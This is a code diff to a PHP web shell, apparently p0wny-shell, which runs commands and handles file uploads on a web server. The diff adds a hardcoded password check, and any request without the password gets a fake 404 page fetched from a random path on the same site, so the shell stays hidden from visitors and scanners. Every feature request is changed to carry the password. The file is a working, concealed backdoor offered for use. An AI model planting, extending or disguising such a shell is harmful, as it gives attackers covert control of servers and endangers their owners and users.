@@ -1,5 +1,33 @@
 <?php
 
+$VAULT_CONFIG = [
+    'supersecretpass' => '1337',       // CHANGE ME!!!
+    'whitelist' => [
+        '',                            // Whitelisted IP's *WIP*
+    ],
+];
+
+if ($_GET['supersecretpass'] !== $VAULT_CONFIG['supersecretpass']) {
+    $randomString = uniqid(mt_rand(), true);
+    $md5Hash = md5($randomString);
+    $baseURL = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'];
+    $fullURL = $baseURL . '/' . $md5Hash;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $fullURL);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    $response = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    curl_close($ch);
+    $headerSize = $info['header_size'];
+    $headers = substr($response, 0, $headerSize);
+    $content = substr($response, $headerSize);
+    header('Content-Type: text/html');
+    http_response_code(404);
+    echo $content;
+    exit();
+}
+
 $SHELL_CONFIG = [
     'username' => 'p0wny',
     'hostname' => 'shell',
@@ -364,7 +392,7 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("?supersecretpass=<?php echo $VAULT_CONFIG['supersecretpass']; ?>&feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
@@ -399,7 +427,7 @@ if (isset($_GET["feature"])) {
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
                 makeRequest(
-                    "?feature=hint",
+                    "?supersecretpass=<?php echo $VAULT_CONFIG['supersecretpass']; ?>&feature=hint",
                     {
                         filename: fileName,
                         cwd: CWD,
@@ -429,7 +457,7 @@ if (isset($_GET["feature"])) {
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                        makeRequest('?supersecretpass=<?php echo $VAULT_CONFIG['supersecretpass']; ?>&feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                             _insertStdout(response.stdout.join("\n"));
                             updateCwd(response.cwd);
                         });
@@ -466,7 +494,7 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest("?feature=pwd", {}, function(response) {
+                makeRequest("?supersecretpass=<?php echo $VAULT_CONFIG['supersecretpass']; ?>&feature=pwd", {}, function(response) {
                     CWD = response.cwd;
                     _updatePrompt();
                 });
